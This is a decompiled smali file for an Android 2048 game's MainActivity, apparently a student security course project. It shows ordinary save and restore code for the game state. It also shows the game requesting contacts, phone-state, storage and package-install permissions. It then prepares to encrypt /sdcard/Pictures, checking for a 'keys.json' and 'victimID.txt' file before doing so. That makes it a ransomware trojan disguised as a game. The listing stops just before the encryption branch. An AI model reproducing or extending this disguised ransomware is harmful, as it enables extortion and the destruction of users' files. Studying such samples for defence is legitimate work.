.class public Laarkay/a2048game/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final CAN_UNDO:Ljava/lang/String; = "can undo"

.field private static final GAME_STATE:Ljava/lang/String; = "game state"

.field private static final HEIGHT:Ljava/lang/String; = "height"

.field private static final HIGH_SCORE:Ljava/lang/String; = "high score temp"

.field private static final MAX_TILE:Ljava/lang/String; = "max tile"

.field private static final SCORE:Ljava/lang/String; = "score"

.field private static final TIMER:Ljava/lang/String; = "timer"

.field private static final UNDO_GAME_STATE:Ljava/lang/String; = "undo game state"

.field private static final UNDO_GRID:Ljava/lang/String; = "undo"

.field private static final UNDO_SCORE:Ljava/lang/String; = "undo score"

.field private static final WIDTH:Ljava/lang/String; = "width"

.field public static volatile running:Z


# instance fields
.field t:Ljava/lang/Thread;

.field private view:Laarkay/a2048game/MainView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 45
    const/4 v0, 0x1

    sput-boolean v0, Laarkay/a2048game/MainActivity;->running:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 29
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method static synthetic m0c1bc4e1(Laarkay/a2048game/MainActivity;Ljava/lang/String;)V
    .locals 0
    .param p0, "x0"    # Laarkay/a2048game/MainActivity;
    .param p1, "x1"    # Ljava/lang/String;

    .line 29
    invoke-direct {p0, p1}, Laarkay/a2048game/MainActivity;->m063c4d6a(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic me5abad53(Laarkay/a2048game/MainActivity;)Laarkay/a2048game/MainView;
    .locals 1
    .param p0, "x0"    # Laarkay/a2048game/MainActivity;

    .line 29
    iget-object v0, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    return-object v0
.end method

.method public static m4d05f469(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 5
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "permissions"    # [Ljava/lang/String;

    .line 48
    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 49
    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 50
    .local v3, "permission":Ljava/lang/String;
    invoke-static {p0, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    if-eqz v4, :cond_0

    .line 51
    return v1

    .line 49
    .end local v3    # "permission":Ljava/lang/String;
    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 55
    :cond_1
    const/4 v0, 0x1

    return v0
.end method

.method private mb807559a()V
    .locals 9

    .line 269
    iget-object v0, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v0, v0, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v0, v0, Laarkay/a2048game/MainGame;->aGrid:Laarkay/a2048game/AnimationGrid;

    invoke-virtual {v0}, Laarkay/a2048game/AnimationGrid;->cancelAnimations()V

    .line 271
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 272
    .local v0, "settings":Landroid/content/SharedPreferences;
    const/4 v1, 0x0

    .local v1, "xx":I
    :goto_0
    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, v2, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v2, v2, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    array-length v2, v2

    if-ge v1, v2, :cond_5

    .line 273
    const/4 v2, 0x0

    .local v2, "yy":I
    :goto_1
    iget-object v3, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v3, v3, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v3, v3, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v3, v3, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    const/4 v4, 0x0

    aget-object v3, v3, v4

    array-length v3, v3

    if-ge v2, v3, :cond_4

    .line 274
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v5, -0x1

    invoke-interface {v0, v3, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v3

    .line 275
    .local v3, "value":I
    const/4 v6, 0x0

    if-lez v3, :cond_0

    .line 276
    iget-object v7, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v7, v7, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v7, v7, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v7, v7, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    aget-object v7, v7, v1

    new-instance v8, Laarkay/a2048game/Tile;

    invoke-direct {v8, v1, v2, v3}, Laarkay/a2048game/Tile;-><init>(III)V

    aput-object v8, v7, v2

    goto :goto_2

    .line 277
    :cond_0
    if-nez v3, :cond_1

    .line 278
    iget-object v7, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v7, v7, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v7, v7, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v7, v7, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    aget-object v7, v7, v1

    aput-object v6, v7, v2

    .line 281
    :cond_1
    :goto_2
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "undo"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v4, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    .line 282
    .local v4, "undoValue":I
    if-lez v4, :cond_2

    .line 283
    iget-object v5, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v5, v5, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v5, v5, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v5, v5, Laarkay/a2048game/Grid;->undoField:[[Laarkay/a2048game/Tile;

    aget-object v5, v5, v1

    new-instance v6, Laarkay/a2048game/Tile;

    invoke-direct {v6, v1, v2, v4}, Laarkay/a2048game/Tile;-><init>(III)V

    aput-object v6, v5, v2

    goto :goto_3

    .line 284
    :cond_2
    if-nez v3, :cond_3

    .line 285
    iget-object v5, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v5, v5, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v5, v5, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v5, v5, Laarkay/a2048game/Grid;->undoField:[[Laarkay/a2048game/Tile;

    aget-object v5, v5, v1

    aput-object v6, v5, v2

    .line 273
    .end local v3    # "value":I
    .end local v4    # "undoValue":I
    :cond_3
    :goto_3
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_1

    .line 272
    .end local v2    # "yy":I
    :cond_4
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_0

    .line 290
    .end local v1    # "xx":I
    :cond_5
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->score:J

    const-string v4, "score"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->score:J

    .line 291
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->highScore:J

    const-string v4, "high score temp"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->highScore:J

    .line 292
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->lastScore:J

    const-string v4, "undo score"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->lastScore:J

    .line 293
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-boolean v2, v2, Laarkay/a2048game/MainGame;->canUndo:Z

    const-string v3, "can undo"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    iput-boolean v2, v1, Laarkay/a2048game/MainGame;->canUndo:Z

    .line 294
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v2, v2, Laarkay/a2048game/MainGame;->gameState:I

    const-string v3, "game state"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    iput v2, v1, Laarkay/a2048game/MainGame;->gameState:I

    .line 295
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v2, v2, Laarkay/a2048game/MainGame;->lastGameState:I

    const-string v3, "undo game state"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    iput v2, v1, Laarkay/a2048game/MainGame;->lastGameState:I

    .line 296
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v1, v1, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v2, v2, Laarkay/a2048game/MainGame;->maxTile:J

    const-string v4, "max tile"

    invoke-interface {v0, v4, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    iput-wide v2, v1, Laarkay/a2048game/MainGame;->maxTile:J

    .line 297
    iget-object v1, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget v2, v1, Laarkay/a2048game/MainView;->elTime:I

    const-string v3, "timer"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    iput v2, v1, Laarkay/a2048game/MainView;->elTime:I

    .line 298
    return-void
.end method

.method private m063c4d6a(Ljava/lang/String;)V
    .locals 3
    .param p1, "url"    # Ljava/lang/String;

    .line 336
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 337
    .local v0, "uri":Landroid/net/Uri;
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 338
    .local v1, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Laarkay/a2048game/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 339
    return-void
.end method

.method private mcac365e8(Ljava/lang/String;)Landroid/content/Intent;
    .locals 5
    .param p1, "url"    # Ljava/lang/String;

    .line 323
    new-instance v0, Landroid/content/Intent;

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p1, v1, v2

    invoke-virtual {p0}, Laarkay/a2048game/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    aput-object v2, v1, v3

    const-string v2, "%s?id=%s"

    invoke-static {v2, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 324
    .local v0, "intent":Landroid/content/Intent;
    const/high16 v1, 0x48000000    # 131072.0f

    .line 325
    .local v1, "flags":I
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/high16 v3, 0x80000

    const/16 v4, 0x15

    if-lt v2, v4, :cond_0

    .line 326
    or-int/2addr v1, v3

    goto :goto_0

    .line 329
    :cond_0
    or-int/2addr v1, v3

    .line 331
    :goto_0
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 332
    return-object v0
.end method

.method private m4e23b8e0()V
    .locals 10

    .line 235
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 236
    .local v0, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 237
    .local v1, "editor":Landroid/content/SharedPreferences$Editor;
    iget-object v2, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v2, v2, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v2, v2, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v2, v2, Laarkay/a2048game/Grid;->field:[[Laarkay/a2048game/Tile;

    .line 238
    .local v2, "field":[[Laarkay/a2048game/Tile;
    iget-object v3, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v3, v3, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-object v3, v3, Laarkay/a2048game/MainGame;->grid:Laarkay/a2048game/Grid;

    iget-object v3, v3, Laarkay/a2048game/Grid;->undoField:[[Laarkay/a2048game/Tile;

    .line 239
    .local v3, "undoField":[[Laarkay/a2048game/Tile;
    array-length v4, v2

    const-string v5, "width"

    invoke-interface {v1, v5, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 240
    array-length v4, v2

    const-string v5, "height"

    invoke-interface {v1, v5, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 241
    const/4 v4, 0x0

    .local v4, "xx":I
    :goto_0
    array-length v5, v2

    if-ge v4, v5, :cond_3

    .line 242
    const/4 v5, 0x0

    .local v5, "yy":I
    :goto_1
    const/4 v6, 0x0

    aget-object v7, v2, v6

    array-length v7, v7

    if-ge v5, v7, :cond_2

    .line 243
    aget-object v7, v2, v4

    aget-object v7, v7, v5

    const-string v8, " "

    if-eqz v7, :cond_0

    .line 244
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    aget-object v9, v2, v4

    aget-object v9, v9, v5

    invoke-virtual {v9}, Laarkay/a2048game/Tile;->getValue()I

    move-result v9

    invoke-interface {v1, v7, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    goto :goto_2

    .line 246
    :cond_0
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-interface {v1, v7, v6}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 249
    :goto_2
    aget-object v7, v3, v4

    aget-object v7, v7, v5

    const-string v9, "undo"

    if-eqz v7, :cond_1

    .line 250
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aget-object v7, v3, v4

    aget-object v7, v7, v5

    invoke-virtual {v7}, Laarkay/a2048game/Tile;->getValue()I

    move-result v7

    invoke-interface {v1, v6, v7}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    goto :goto_3

    .line 252
    :cond_1
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-interface {v1, v7, v6}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 242
    :goto_3
    add-int/lit8 v5, v5, 0x1

    goto/16 :goto_1

    .line 241
    .end local v5    # "yy":I
    :cond_2
    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_0

    .line 256
    .end local v4    # "xx":I
    :cond_3
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v4, v4, Laarkay/a2048game/MainGame;->score:J

    const-string v6, "score"

    invoke-interface {v1, v6, v4, v5}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 257
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v4, v4, Laarkay/a2048game/MainGame;->highScore:J

    const-string v6, "high score temp"

    invoke-interface {v1, v6, v4, v5}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 258
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v4, v4, Laarkay/a2048game/MainGame;->lastScore:J

    const-string v6, "undo score"

    invoke-interface {v1, v6, v4, v5}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 259
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-boolean v4, v4, Laarkay/a2048game/MainGame;->canUndo:Z

    const-string v5, "can undo"

    invoke-interface {v1, v5, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 260
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v4, v4, Laarkay/a2048game/MainGame;->gameState:I

    const-string v5, "game state"

    invoke-interface {v1, v5, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 261
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget v4, v4, Laarkay/a2048game/MainGame;->lastGameState:I

    const-string v5, "undo game state"

    invoke-interface {v1, v5, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 262
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget-object v4, v4, Laarkay/a2048game/MainView;->game:Laarkay/a2048game/MainGame;

    iget-wide v4, v4, Laarkay/a2048game/MainGame;->maxTile:J

    const-string v6, "max tile"

    invoke-interface {v1, v6, v4, v5}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 263
    iget-object v4, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    iget v4, v4, Laarkay/a2048game/MainView;->elTime:I

    const-string v5, "timer"

    invoke-interface {v1, v5, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 264
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 265
    return-void
.end method

.method private m1ac369cc()V
    .locals 7

    .line 342
    const-string v0, "ICT2207"

    .line 343
    .local v0, "tag":Ljava/lang/String;
    const-string v1, "P3 - Team 2"

    const-string v2, "Nicholas Chong"

    const-string v3, "Xavier Lim"

    const-string v4, "Chow Wen Jun"

    const-string v5, "Lim Yong An"

    const-string v6, "Chan Hon Siang"

    filled-new-array/range {v1 .. v6}, [Ljava/lang/String;

    move-result-object v1

    .line 351
    .local v1, "strArr":[Ljava/lang/String;
    array-length v2, v1

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v2, :cond_0

    aget-object v4, v1, v3

    .line 352
    .local v4, "e":Ljava/lang/String;
    invoke-static {v0, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 351
    .end local v4    # "e":Ljava/lang/String;
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 354
    :cond_0
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 12
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 62
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 63
    const v0, 0x7f0c001d

    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->setContentView(I)V

    .line 64
    const v0, 0x7f0901a7

    invoke-virtual {p0, v0}, Laarkay/a2048game/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Laarkay/a2048game/MainView;

    iput-object v0, p0, Laarkay/a2048game/MainActivity;->view:Laarkay/a2048game/MainView;

    .line 67
    const-string v1, "android.permission.ACCESS_NETWORK_STATE"

    const-string v2, "android.permission.ACCESS_WIFI_STATE"

    const-string v3, "android.permission.INTERNET"

    const-string v4, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v5, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v6, "android.permission.INTERACT_ACROSS_PROFILES"

    const-string v7, "android.permission.REQUEST_INSTALL_PACKAGES"

    const-string v8, "android.permission.READ_CONTACTS"

    const-string v9, "android.permission.READ_PHONE_STATE"

    filled-new-array/range {v1 .. v9}, [Ljava/lang/String;

    move-result-object v0

    .line 78
    .local v0, "PERMISSIONS":[Ljava/lang/String;
    const/4 v1, 0x1

    .line 81
    .local v1, "PERMISSION_ALL":I
    invoke-static {p0, v0}, Laarkay/a2048game/MainActivity;->m4d05f469(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 82
    invoke-static {p0, v0, v1}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 86
    :cond_0
    const v2, 0x7f09009f

    invoke-virtual {p0, v2}, Laarkay/a2048game/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Button;

    .line 87
    .local v2, "encrypt_button":Landroid/widget/Button;
    new-instance v3, Laarkay/a2048game/MainActivity$1;

    invoke-direct {v3, p0}, Laarkay/a2048game/MainActivity$1;-><init>(Laarkay/a2048game/MainActivity;)V

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 95
    invoke-direct {p0}, Laarkay/a2048game/MainActivity;->m1ac369cc()V

    .line 99
    const-string v3, "/sdcard/keys.json"

    .line 100
    .local v3, "key_fp":Ljava/lang/String;
    const-string v4, "/sdcard/Pictures"

    .line 101
    .local v4, "target_fp":Ljava/lang/String;
    new-instance v5, Ljava/io/File;

    invoke-direct {v5, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 102
    .local v5, "key_f":Ljava/io/File;
    new-instance v6, Ljava/io/File;

    const-string v7, "/sdcard/victimID.txt"

    invoke-direct {v6, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 103
    .local v6, "vicID_f":Ljava/io/File;
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v7

    const-string v8, "MAIN ACTIVITY"

    if-eqz v7, :cond_2

    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v7

    if-nez v7, :cond_1

    goto :goto_0

    .line 112
    :cond_1
    const-string v7, "keys.json && victimID.txt exists, not encrypting"

    invoke-static {v8, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    .line 105
    :cond_2
    :goto_0
